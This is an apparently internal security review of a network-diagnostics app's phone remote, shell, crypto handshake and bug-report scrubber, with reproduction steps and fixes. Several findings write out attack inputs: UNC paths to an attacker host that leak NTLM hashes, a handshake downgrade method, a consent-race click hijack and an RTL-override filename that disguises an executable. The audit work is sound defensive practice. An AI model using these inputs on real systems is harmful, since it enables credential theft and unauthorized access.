**Verdict: BLOCKER.** One item blocks release (#1). The phone can make the PC open any local file or network path, including `\\attacker\share`, which leaks NTLM. The fix is small: put `icmpexplain`, `chain` and `certcmds` in `RemoteNo`, and refuse every network path after `Path.GetFullPath`. Everything else is medium or low.

Scope: security review of 999a100 (dev-1.1.6). I read every line of src/Remote/*.cs, Relay.cs, PhoneHub/PhoneAsk, RemoteFiles, RemoteKnown, RemoteWords, BugReport.cs, LabLink.cs, tools/remote/worker.js, and the crypto and handshake part of docs/app.html (lines 270-650). I read FullView.Remote.cs, the parts of AppCtx.cs that wire up the phone, and FullView.Phone.cs (the Allow card). For the shell (FullView.Shell*.cs, ShellAwk.cs, TermEditor.cs) I read the file-system sandbox, the gates, the editor's save path and the curl path, and ran hostile scripts against the real interpreter.
Harnesses are in `review5/sec/`:
- `sh.exe`: builds a real FullView under xvfb, needs `fonts.conf`, and calls `TestShell` / `RemoteAllowed` / `CertTools.Input` / `Replay.IcmpExplain`.
- `ed.exe`: runs TermEditor.
- `scr.exe`: runs BugReport.Scrub.
- `scr2.exe`: runs ShScrub.

Mono limits: the ECDH handshake can't run (CNG stub), and `/data` writes are refused under mono because InData uses `\` paths. I reasoned from .NET Framework where the two differ.

Counts: 11 findings: 8 security, 2 slow, 1 wrong result. 6 confirmed (ran), 5 suspected (read).

---

### 1. The phone can make the PC open any local file or a `\\server\share` path: NTLM leak and a file-existence oracle
Severity: security
Where: src\Ui\FullView.Remote.cs line 18-30 (RemoteNo / RemoteOk: a deny-list, so these tools pass). src\Ui\FullView.Toolbox.cs line 133 (`icmpexplain` → Replay.IcmpExplain → Pcap.Read, src\Checks\Pcap.cs line 34-37, no network-path check at all). Line 152 (`chain` → CertChain.Check → CertTools.Input, src\Checks\CertTools.cs line 32, which checks only `StartsWith(@"\\")`).
How to reproduce:
1. Pair a phone.
2. In the phone's Toolbox, run "ICMP error translator" with `\\203.0.113.9\x\a.pcap`, or "Chain check" with `//203.0.113.9/x/c.pem`. The second box of Chain check ("intermediate / root files, separate with ;") takes more paths.
Ran:
- `RemoteAllowed("icmpexplain")`, `("chain")`, `("certcmds")`, `("netsnap")` all return True.
- `CertTools.Input("//attacker/share/c.pem")` gets past the "Network paths aren't read" guard to `new FileInfo` ("not found: //attacker/share/c.pem").
- The backslash form `\\attacker\...` is refused there.
- `Replay.IcmpExplain("/etc/passwd")` says "not a pcap or pcapng file" and `("/etc/nonexistent")` says "file not found". The phone can test whether any path exists on the PC.
What happens:
- On Windows, `FileInfo(...).Exists` on a network path opens an SMB connection. Windows then sends the user's NetNTLMv2 hash to the attacker's server, outbound, to a host the PC user never asked for.
- `//host/share` is normalized to `\\host\share` by .NET Framework, so CertTools' guard is bypassed both from the phone and from a pasted path on the PC.
- Pcap.Read also reads any readable file up to 64 MB into memory. That is the whole 64 MB budget, on a remote request.
- The rule written at the top of FullView.Remote.cs ("nothing that ... works on a local file") is broken.
What should happen:
- Add `icmpexplain`, `chain`, `certcmds` and `netsnap` to `RemoteNo`. Better still, make the phone list an allow-list, so a new tool doesn't become remote-runnable by default.
- In both readers, refuse any path whose `Path.GetFullPath` starts with `\\` (this covers `//`, `/\`, `\\?\UNC\`, and `\\.\`/`\\?\` device paths).
Confidence: confirmed (ran the reflection harness above; the SMB/NTLM step is reasoned from .NET Framework/Windows behaviour, not run)
Rule: 1 (SMB to a host the user didn't ask for), plus the phone rule in FullView.Remote

### 2. The six matching words (H-1) can be downgraded to four: neither side requires the signed word count
Severity: security
Where: src\Remote\Remote.cs line 141 (`if (j.S("mac2") != null)`: mac2 is optional) and line 147-150 (`w2` missing → wv 1, four 32-bit words). docs\app.html line 405 (`m.mac2 != null && ...`: the phone also accepts an unsigned `wv`) and line 409-412 (the phone accepts `ok` with no `key` first, so it shows no words at all).
How to reproduce (an attacker on the relay who also has the QR secret, which is the H-1 threat model):
1. Send the PC its own `hi` with `w:"1"` and no `w2`/`mac2`. The PC shows 4 v1 words W.
2. Play the PC toward the real phone. Its `key` has `wv:2` plus a valid mac2 (the attacker knows the secret).
3. Pick the fake PC key so that the first 4 v2 words match W. That is a 2^32 search, minutes with incremental point addition.
The phone shows 6 words whose first 4 equal the PC's 4. A relay with the secret can also send `ok` with no `key`, and the phone pairs without showing any words.
What happens: the H-1 / R-1 fix only holds when both sides choose to send mac2. A 1.1.6 PC still accepts the 1.1.5 handshake.
What should happen: for a code session (Known == null) the PC should require `w2 == "1"` and a valid `mac2`. The phone should require mac2 when `wv` is present, and refuse `ok` unless a verified `key` came first.
Confidence: suspected (read; the CNG stub stops the handshake running under mono)

### 3. IT can't switch off the phone remote or the waiting room; `online_lookups = off` doesn't stop it
Severity: security
Where: src\AppCtx.cs line 352-372 (StandbyTick), src\Remote\Remote.cs line 88-95 (Start), src\Remote\RemoteKnown.cs line 71-90 (CheckClock to adeebometer-live), src\Policy.cs (no key for any of these).
How to reproduce:
1. Create `AdeeboMeter.policy` with `online_lookups = off`.
2. Remember a phone.
3. Restart. The PC opens wss to adeebometer-remote.orkoadeeb.workers.dev every slot, and the hourly clock GET.
4. The phone, from anywhere, can run `http`, `tcpping`, `rdpcheck`, `ldapcheck`, `board`, `allips` and `speedtest` (any URL), and push files into Downloads.
What happens: Relay (reports) and Weather honour `Policy.NoOnline`; the remote doesn't. A remembered phone becomes a standing outside-in probe of the company LAN that an IT team has no switch for. Rule 6 isn't broken, but the policy can't contain this.
What should happen: add a `phone_remote = off` key (ending sessions and standby, and hiding the page), and treat `online_lookups = off` as covering it too.
Confidence: confirmed (read: no Policy reference anywhere on the phone path)

### 4. "Copy link" puts the QR secret on the normal clipboard (Win+V history and Cloud Clipboard)
Severity: security
Where: src\Ui\FullView.Phone.cs line 204 (`Clipboard.SetText(link)`)
How to reproduce: on the Your phone page, press Copy link. Press Win+V: the `…/app#room.SECRET` link is in the history. With Cloud Clipboard on, it is synced to the Microsoft account's other devices.
What happens: the app already has `Program.CopySecret` (src\Program.cs line 263), which excludes text from history, cloud and monitors, but this button doesn't use it. The link also stays on the clipboard after pairing or expiry. The window is limited (2 minutes, single-use room), but it is still a code copied the plain way.
What should happen: use `Program.CopySecret(link)`, and clear the clipboard when the session pairs or ends if it still holds the link.
Confidence: confirmed (read)
Rule: 4

### 5. A remembered phone's `hi` isn't tied to a room or a PC challenge: a relay can replay it, and the PC shows "Linked" with no phone
Severity: security
Where: src\Remote\Remote.cs line 136-163 (Known path: `hi` MAC = HMAC(auth, "hi"|pk) only; no Allow)
How to reproduce:
1. The relay records a remembered phone's `hi` in any room.
2. In a later slot it replays the same frame into the PC's new standby room. The MAC still verifies, because the room isn't in it.
3. The PC goes Paired, shows "Linked to iPhone · a remembered phone - it proved its key", and stops waiting in the other rooms (KnownChanged).
What happens: the relay can't read or inject, because it lacks the phone's old private key. It can still fake a linked phone for 30 minutes and lock the real phone out, again every slot. The PC user sees a false "linked" state.
What should happen: put the room name (and/or a PC nonce sent first) into the `hi` MAC. Only mark the session Paired after the first sealed message from the phone opens.
Confidence: suspected (read)

### 6. Allow / Accept / Remember buttons aren't tied to the question shown, so a paired phone can swap the question under the click
Severity: security
Where: src\Remote\PhoneHub.cs line 31-41 (a new Ask silently replaces the pending one; Answer applies to whatever is pending) and src\Ui\FullView.Phone.cs line 178-179 (the click delegates don't capture `q`; no delay before the buttons work)
How to reproduce:
1. While paired, the phone sends `fput`. The PC shows "Accept a file?".
2. While the user reaches for Accept, the phone sends `remember`.
3. The click lands on the same spot (now "Remember it") from the last paint's hit-rect and answers the new question. Yes to a permanent, no-Allow key.
4. Spamming `remember` (no limit; each one pops the main window to the front through Show) makes the timing easy and also steals focus.
What happens: this is a consent race, and it can turn a one-time session into a remembered phone.
What should happen:
- Bind each button to its own `Q` (`Answer(q, yes)` ignores a stale q).
- Arm the buttons about 1 s after a question first appears or changes.
- Allow one "remember" per session, and rate-limit questions.
Confidence: suspected (read)

### 7. Shell: `curl -u user:pass` echoes the password, and Copy / Save log don't mask it
Severity: security
Where: src\Ui\FullView.ShellSys.cs line 97/102 (Curl: the ignored options are echoed in full) and src\Ui\FullView.Shell.cs line 307 (ScrubFlag has no `-u`/`--user`)
How to reproduce: in AdeeboShell, run `curl -u bob:s3cretPW http://127.0.0.1:1/`.
Ran: the output shows `left out: -u bob:s3cretPW`. `ShScrub("curl -u bob:s3cretPW http://x")` returns the line unchanged, so Copy all and Save log write the password. `-H "Authorization: Bearer …"` is masked on copy, but it is still echoed on screen.
What should happen: mask `-u/--user value`, `--proxy-user`, and the `user:pass@` URL forms in both the echo and ShScrub, and don't echo ignored header values.
Confidence: confirmed (ran sh.exe t7.txt and scr2.exe)
Rule: 4

### 8. The report scrubber leaves most of a user path, surnames and some addresses in "names and paths removed" log lines
Severity: security
Where: src\BugReport.cs line 61-72 (Scrub: userPath runs first, then anyPath stops at the inserted `<`)
How to reproduce: `Scrub(@"couldn't save C:\Users\jsmith\Downloads\AdeeboMeter\secret plan.pdf", ...)`.
Ran, with output:
- `C:\Users\jsmith\Downloads\AdeeboMeter\secret plan.pdf` became `<path><user>\Downloads\AdeeboMeter\secret plan.pdf` (folder and file names kept).
- With user name "Jane Doe": `C:\Users\Jane Doe\Documents\x.txt` became `<path><user> Doe\Documents\x.txt` (surname kept).
- `C:/Users/jsmith/AppData/x` is unchanged.
- `\\JANE-PC\share\x` became `\\<pc>\share\x` (share name kept).
- `AABBCCDDEEFF` is kept.
What happens: the report box says names and paths are taken out, but file and folder names after the profile go to a public GitHub issue. Exception messages logged by the phone file path ("remote file: …") and other paths carry these. The user does see the preview, so this is a promise/behaviour mismatch, not silent sending.
What should happen: run anyPath and unc before userPath (or make anyPath swallow `<user>`), handle `/` paths, scrub the whole profile user name including spaces, and match bare 12-hex MACs.
Confidence: confirmed (ran scr.exe)

### 9. Shell memory has no ceiling: variable doubling, awk string doubling and huge printf widths go far past 64 MB
Severity: slow
Where: src\Ui\FullView.Shell.cs (assignment and expansion: no size cap on variables), src\Ui\ShellAwk.cs (concatenation: no cap), src\Ui\FullView.ShellSys.cs (printf width applied before the 16 MB output cap)
How to reproduce (ran with TestShell):
- `a=x; for i in $(seq 1 26); do a=$a$a; done; echo ${#a}` gives 67,108,864 chars in 3.1 s, working set 462 MB. With 40 rounds it is still running past 20 s at 2.6 GB.
- `awk 'BEGIN{s="x"; while(1) s=s s}'` throws OutOfMemoryException out of TestShell at 2.1 GB. The shell's top level catches it, but every other thread in the app can hit OOM at the same moment.
- `printf '%999999999d' 1` takes 10 s at about 2 GB before "more than 16 MB of output".
What should happen: cap a variable or awk string at the same 8 M characters as ShMaxCap (ShTooBig), and reject printf widths or precisions over the cap before padding.
Confidence: confirmed (ran sh.exe t2-t6)
Rule: 7

### 10. nano/vim: a count up to 100000 on `yy` / `p` builds gigabytes on the window thread
Severity: slow
Where: src\Ui\TermEditor.cs line 152 (Count is capped at 100000 only), line 245-246 (`p` does InsertRange n times / `Enumerable.Repeat(yank, n)`), line 209-210 (yy)
How to reproduce: in `vim` on a file with one 1,000-character line, type `yy`, `100000p`, `gg`, `100000yy`, `50p`.
Ran: 548 MB after `50p`, within a second. `100000p` instead of `50p` ran for minutes past 3 GB (killed). Every key is handled on the UI thread, so the whole app freezes, and Snap() keeps an undo copy as well.
What should happen: cap the size of the result (for example 5 MB, the same as the open limit) before inserting, not just the count.
Confidence: confirmed (ran ed.exe)
Rule: 7

### 11. A phone file whose name has `"`, `<`, `>`, `|` or a control character ends the whole session; RTL tricks pass through
Severity: wrong result
Where: src\Remote\RemoteFiles.cs line 158 (SafeName calls `Path.GetFileName` before replacing invalid characters)
How to reproduce: from the phone, send a file named `report "v2".pdf`.
What happens:
- On .NET Framework 4.8, `Path.GetFileName` throws ArgumentException ("Illegal characters in path") for `" < > |` and characters below 32.
- The exception is thrown on the receive thread, and Run's catch ends the session as "connection lost".
- `U+202E` (right-to-left override) is not stripped: `photo\u202Egpj.exe` is shown on the Accept card as "photoexe.jpg" and saved as an .exe. It does get the mark of the web.
What should happen: replace invalid characters (and bidi/format characters, Unicode category Cf) before `GetFileName`, or split on `/` and `\` by hand.
Confidence: suspected (.NET Framework semantics; mono's GetFileName doesn't throw)

---

## Checked and held up

- **Lane crypto (PC and phone match).** Encrypt-then-MAC. The HMAC covers direction byte, sequence, IV and ciphertext, so reflection, reorder and replay are dropped.
  - The tag is compared in constant time on both sides, before decrypting.
  - Fresh random 16-byte IV per message.
  - HKDF-SHA256 (RFC 5869 is correct; the phone uses WebCrypto HKDF with the same salt, info and length).
  - Separate encryption and MAC keys per direction.
  - Fresh P-256 ECDH keys each session, and the private key is disposed right after the keys are derived.
  - Session keys are wiped on End.
  - The QR secret is 256 bits and the room 128 bits, both from CSPRNG.
  - The words list has exactly 256 unique entries (no index fault), and the PC's word recipe matches the phone's.
  - The phone drops the `#secret` from the address bar at once.
- **Relay worker.** Room ids are `^[A-Za-z0-9_-]{22}$` (128-bit, or HMAC-derived for remembered phones). One PC and one phone; a second phone gets 409. Used rooms are marked done for 30 minutes (no reuse). 64 KB and 40 messages a second per side, Origin pinned for phones, per-IP room limits, no storage of content. It can't read or forge anything without the QR secret or the phone key.
- **Remembered phones.** phones.txt is DPAPI CurrentUser with extra entropy, and the key is 32 random bytes. On the phone, the key is wrapped with AES-GCM under a WebAuthn PRF output (user verification required), and the page refuses to keep it without PRF. Forget only removes the id the phone names. At most 3 phones.
- **What the phone may start.** Lab and sender tools (`LabGate`, `SenderGate`), SNMP, keys and certificate tools, the shell, sweep, iperf and replays are all refused (`RemoteAllowed` checked). Inputs are at most 4 × 200 characters, MTR from the phone is capped at 5 minutes, and locked boxes are never filled. Secret rows are filtered from results, and one check runs at a time with Stop. Peek is limited to a fixed page list, 2 MB, 1 every 2 s.
- **RemoteFiles limits.** Up to 200 MB to disk piece by piece. Pieces must arrive in order and within the declared size, checked again at fend. Two transfers at once at most. Partial files go to a staging `.part` and are swept. The name is cleaned with SafeName (apart from #11), the target path is made unique, the mark of the web is added, and Accept defaults to No with a 90-second timeout.
- **Allow prompt.** It defaults to No after 90 s. A session that ends while asking answers No. A second `hi` while asking is ignored, and a page without words is refused for code sessions.
- **Shell sandbox (ran).** `> /home/x`, `/data/../..`, `/data/a:ads`, `/data/C:/…`, `touch /mnt/c/x`, `cp … /home/`, `rm -rf /home`, `rm -rf /` and `mv /data /home/x` are all refused. InData rejects trailing dot or space, junctions and symlinks along the way, and hard links. Paths are split on `/`, so `\\server` can't be formed. The shell starts no processes (`open` only launches explorer on /data). Lab and sender tools ask first (`--yes` in scripts), and Policy NoLab/NoSpeed/NoCapture are enforced inside the tools. curl/wget map to the `http` tool, which downloads nothing. `yes`, `while true` (100k rounds), recursion (100 deep), `$( )` nesting (40), seq (1M) and brace expansion are bounded. Catastrophic grep, awk and sed patterns stop at 2 s. awk endless loops stop at 20M steps. nano/vim `:s` has a 1-second regex timeout, saves only inside /data, and opens at most 5 MB.
- **LabLink.** Process.Start runs only msedge (App Paths / Program Files) with a file:// URL. The JSON is base64url in the fragment, `view`/`arg` are regex-checked, the injected views are `<`-escaped, and it doesn't listen.
- **Relay.cs (reports).** It sends only on Send, honours `Policy.NoOnline`, reads at most 16 KB of the reply, keeps an outbox of 3 scrubbed reports for 7 days, and sends nothing in the background except that outbox. "Add technical details" is unticked by default, and what's sent is the preview text the user saw.
- **Weather.** Honours `Policy.NoOnline` and is listed in About. It sends only coordinates (or the place name typed into search), and the place isn't logged.
- **Grep pass:**
  - No TcpListener, HttpListener, Listen or bound server port. UDP clients bind only to ephemeral port 0, and rlisten/discover use tshark.
  - No Nokia or SR OS terms in src, docs or tools.
  - No hard-coded secret in src.
  - docs/analytics.js holds a public Cloudflare beacon site token. It is on the website only, not app.html.
  - New hosts (adeebometer-remote, -relay and -live .orkoadeeb.workers.dev, api.open-meteo.com) are all in About › "What leaves your PC". The phone waiting room and its hourly time request are described there.
